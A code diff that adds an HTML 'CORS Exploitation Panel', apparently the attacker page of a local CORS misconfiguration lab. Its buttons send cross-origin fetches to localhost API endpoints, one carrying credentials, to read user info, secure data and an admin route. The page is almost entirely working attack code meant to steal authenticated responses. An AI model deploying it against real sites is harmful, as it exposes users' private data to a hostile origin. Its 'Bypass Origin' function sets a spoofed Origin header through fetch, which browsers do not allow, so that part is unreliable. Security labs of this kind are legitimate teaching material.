@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS Attacker</title>
+</head>
+<body>
+    <h2>CORS Exploitation Panel</h2>
+
+    <button onclick="stealUser()">Steal User Info</button>
+    <button onclick="stealSecure()">Steal Secure Data</button>
+    <button onclick="reflection()">Exploit Reflection</button>
+    <button onclick="broken()">Bypass Origin</button>
+    <button onclick="preflight()">Exploit Preflight</button>
+
+    <pre id="output"></pre>
+
+<script>
+const target = "http://localhost:5000";
+
+function show(data) {
+    document.getElementById("output").innerText = data;
+}
+
+function stealUser() {
+    fetch(target + "/api/userinfo")
+        .then(res => res.text())
+        .then(show);
+}
+
+function stealSecure() {
+    fetch(target + "/api/secure-data", {
+        credentials: "include"
+    })
+    .then(res => res.text())
+    .then(show);
+}
+
+function reflection() {
+    fetch(target + "/api/reflection")
+        .then(res => res.text())
+        .then(show);
+}
+
+function broken() {
+    fetch(target + "/api/broken", {
+        headers: {
+            "Origin": "https://trusted.com.evil.com"
+        }
+    })
+    .then(res => res.text())
+    .then(show);
+}
+
+function preflight() {
+    fetch(target + "/api/admin", {
+        method: "POST",
+        headers: {
+            "Authorization": "Bearer test"
+        }
+    })
+    .then(res => res.text())
+    .then(show);
+}
+</script>
+
+</body>
+</html>
